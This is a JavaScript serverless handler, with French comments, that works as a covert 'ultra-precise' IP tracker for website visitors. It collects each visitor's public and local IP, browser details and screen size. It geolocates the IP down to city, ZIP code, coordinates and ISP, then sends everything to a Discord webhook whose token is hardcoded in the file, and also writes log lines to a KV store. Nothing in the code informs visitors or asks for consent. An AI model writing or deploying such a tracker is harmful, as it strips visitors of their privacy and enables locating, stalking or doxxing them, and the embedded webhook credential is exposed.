export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const forwarded = req.headers['x-forwarded-for'];
  const publicIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
  
  let geo = {};
  try {
    // Utilisation d'un service plus précis avec plus de détails
    const geoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
    geo = await geoRes.json();
  } catch (e) {
    console.error("Erreur géo:", e);
  }

  const { localIp, userAgent, language, screenResolution, referrer, page } = req.body;

  const logEntry = {
    timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
    publicIp,
    localIp,
    location: `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`,
    isp: geo.isp || 'ISP inconnu',
    coords: `${geo.lat || '?'}, ${geo.lon || '?'}`,
    userAgent,
    language,
    screenResolution,
    referrer,
    page: page || 'Inconnue'
  };

  console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));

  // Envoi vers Discord
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1511034814160048168/pQTS0_mbTfqLHz9VhiZ3M2f6_xVL8iH-XzIFMNkAATS7Tn_ShSwIgNFDw-5uMXTnw58B';
  
  if (webhookUrl) {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🚀 Nouvelle Visite sur le Site !",
            color: 0x00ff00,
            fields: [
              { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
              { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
              { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
              { name: "📍 Localisation", value: `**${logEntry.location}**\nCoords: ${logEntry.coords}` },
              { name: "📡 Fournisseur (ISP)", value: logEntry.isp },
              { name: "📄 Page", value: logEntry.page },
              { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
              { name: "🖥️ Résolution", value: screenResolution, inline: true }
            ],
            footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
          }]
        })
      });
    } catch (e) {
      console.error("Erreur Webhook Discord:", e);
    }
  }

  // Stockage pour le fichier .txt (Vercel KV)
  if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
    try {
      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Page:${logEntry.page}\n`;
      await fetch(`${process.env.KV_REST_API_URL}/lpush/visitor_logs/${encodeURIComponent(logLine)}`, {
        headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
      });
    } catch (e) {
      console.error("Erreur Stockage KV:", e);
    }
  }

  return res.status(200).json({ success: true, ip: publicIp });
}
